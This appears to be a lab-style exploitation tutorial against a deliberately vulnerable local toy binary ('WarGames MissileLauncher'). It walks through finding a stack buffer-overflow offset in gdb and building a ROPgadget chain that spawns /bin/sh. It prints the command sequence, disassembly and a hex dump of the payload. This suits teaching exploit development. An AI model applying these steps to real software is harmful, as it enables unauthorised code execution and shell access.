# Let's give a simpler example a go

```
clang++ -m32 -static -fno-stack-protector -o target target.cpp
```

To add the right number of padding bytes we need to know the offset of the return pointer - but this we've done before
```
$ pattern_create -l 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
```

Get the distance from the beginning of the buffer to the return address
```
gdb -q target
Reading symbols from target...(no debugging symbols found)...done.
(gdb) disass authenticate_and_launch
Dump of assembler code for function _Z23authenticate_and_launchv:
   0x08048d50 <+0>:	push   %ebp
   0x08048d51 <+1>:	mov    %esp,%ebp
   0x08048d53 <+3>:	sub    $0x98,%esp
   0x08048d59 <+9>:	lea    0x8176a7f,%eax
   0x08048d5f <+15>:	lea    -0x73(%ebp),%ecx
   0x08048d62 <+18>:	movl   $0x2,-0x4(%ebp)
   0x08048d69 <+25>:	movb   $0x0,-0x5(%ebp)
   0x08048d6d <+29>:	mov    %eax,(%esp)
   0x08048d70 <+32>:	mov    %ecx,0x4(%esp)
   0x08048d74 <+36>:	call   0x81006e0 <printf>
   0x08048d79 <+41>:	lea    0x8176a83,%ecx
   0x08048d7f <+47>:	mov    %ecx,(%esp)
   0x08048d82 <+50>:	mov    %eax,-0x78(%ebp)
   0x08048d85 <+53>:	call   0x81006e0 <printf>
   0x08048d8a <+58>:	lea    0x81e8e60,%ecx
   0x08048d90 <+64>:	lea    -0x73(%ebp),%edx
   0x08048d93 <+67>:	mov    %ecx,(%esp)
   0x08048d96 <+70>:	mov    %edx,0x4(%esp)
   0x08048d9a <+74>:	mov    %eax,-0x7c(%ebp)
   0x08048d9d <+77>:	call   0x8049610 <_ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_>
   0x08048da2 <+82>:	lea    -0x73(%ebp),%ecx
   0x08048da5 <+85>:	mov    %esp,%edx
   0x08048da7 <+87>:	mov    %ecx,(%edx)
   0x08048da9 <+89>:	movl   $0x8176a8c,0x4(%edx)
   0x08048db0 <+96>:	mov    %eax,-0x80(%ebp)
   0x08048db3 <+99>:	call   0x8048200
   0x08048db8 <+104>:	cmp    $0x0,%eax
   0x08048dbb <+107>:	jne    0x8048dc5 <_Z23authenticate_and_launchv+117>
   0x08048dc1 <+113>:	movb   $0x1,-0x5(%ebp)
   0x08048dc5 <+117>:	testb  $0x1,-0x5(%ebp)
   0x08048dc9 <+121>:	je     0x8048dee <_Z23authenticate_and_launchv+158>
   0x08048dcf <+127>:	lea    0x8176a93,%eax
   0x08048dd5 <+133>:	mov    %eax,(%esp)
   0x08048dd8 <+136>:	call   0x8101580 <puts>
   0x08048ddd <+141>:	mov    -0x4(%ebp),%ecx
   0x08048de0 <+144>:	mov    %ecx,(%esp)
   0x08048de3 <+147>:	mov    %eax,-0x84(%ebp)
   0x08048de9 <+153>:	call   0x8048d20 <_Z15launch_missilesi>
   0x08048dee <+158>:	testb  $0x1,-0x5(%ebp)
   0x08048df2 <+162>:	jne    0x8048e0c <_Z23authenticate_and_launchv+188>
   0x08048df8 <+168>:	lea    0x8176aa2,%eax
   0x08048dfe <+174>:	mov    %eax,(%esp)
   0x08048e01 <+177>:	call   0x8101580 <puts>
   0x08048e06 <+182>:	mov    %eax,-0x88(%ebp)
   0x08048e0c <+188>:	add    $0x98,%esp
   0x08048e12 <+194>:	pop    %ebp
   0x08048e13 <+195>:	ret    
End of assembler dump.
(gdb) br *authenticate_and_launch+195
Breakpoint 1 at 0x8048e13
(gdb) r
Starting program: target 
WarGames MissileLauncher v0.1
0xffffcc85
Secret: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Access denied

Breakpoint 1, 0x08048e13 in authenticate_and_launch() ()
(gdb) x/1xw $sp
0xffffccfc:	0x30654139
(gdb) q
```

```
$ pattern_offset -q 30654139
[*] Exact match at offset 119
```

Make a ROP chain using ROPgadget
```
ROPgadget --ropchain --binary target --badbytes 0b
```

Copy the ROP chain and the offset to the chain.py file
Write the output to a file so that it can be used in gdb
```
./chain.py > file
```

Let's have a look
```
$ xxd -g 4 file
00000000: 90909090 90909090 90909090 90909090  ................
00000010: 90909090 90909090 90909090 90909090  ................
00000020: 90909090 90909090 90909090 90909090  ................
00000030: 90909090 90909090 90909090 90909090  ................
00000040: 90909090 90909090 90909090 90909090  ................
00000050: 90909090 90909090 90909090 90909090  ................
00000060: 90909090 90909090 90909090 90909090  ................
00000070: 90909090 909090cc 82040860 701e08f6  ...........`p...
00000080: 9e0e082f 62696e6c dd050841 41414141  .../binl...AAAAA
00000090: 41414141 414141cc 82040864 701e08f6  AAAAAAA....dp...
000000a0: 9e0e082f 2f73686c dd050841 41414141  ...//shl...AAAAA
000000b0: 41414141 414141cc 82040868 701e08e0  AAAAAAA....hp...
000000c0: 7505086c dd050841 41414141 41414141  u..l...AAAAAAAAA
000000d0: 414141dd 81040860 701e08b2 51130868  AAA....`p...Q..h
000000e0: 701e0860 701e088c 51130868 701e08e0  p..`p...Q..hp...
000000f0: 750508ac c80808ac c80808ac c80808ac  u...............
00000100: c80808ac c80808ac c80808ac c80808ac  ................
00000110: c80808ac c80808ac c80808ac c80808b3  ................
00000120: 8a0e080a
```

Feed it to the target
```
$ gdb -q target
Reading symbols from target...(no debugging symbols found)...done.
(gdb) br *authenticate_and_launch+195
Breakpoint 1 at 0x8048e13
(gdb) r < file
Starting program: target < file
WarGames MissileLauncher v0.1
0xffffcc85
Secret: Access denied

Breakpoint 1, 0x08048e13 in authenticate_and_launch() ()
(gdb) x/1xw $sp
0xffffccfc:	0x080482cc
(gdb) stepi
0x080482cc  [...]
(gdb) stepi
0x080482cd  [...]
(gdb) stepi
0x080e9ef6  [...]
(gdb) stepi
0x080e9ef7  [...]
(gdb) stepi
0x0805dd6c  [...]
(gdb) stepi
0x0805dd6e  [...]
(gdb) stepi
0x0805dd6f  [...]
(gdb) stepi
0x0805dd70  [...]
(gdb) stepi
0x0805dd71  [...]
(gdb) stepi
0x080482cc  [...]
(gdb) q
```
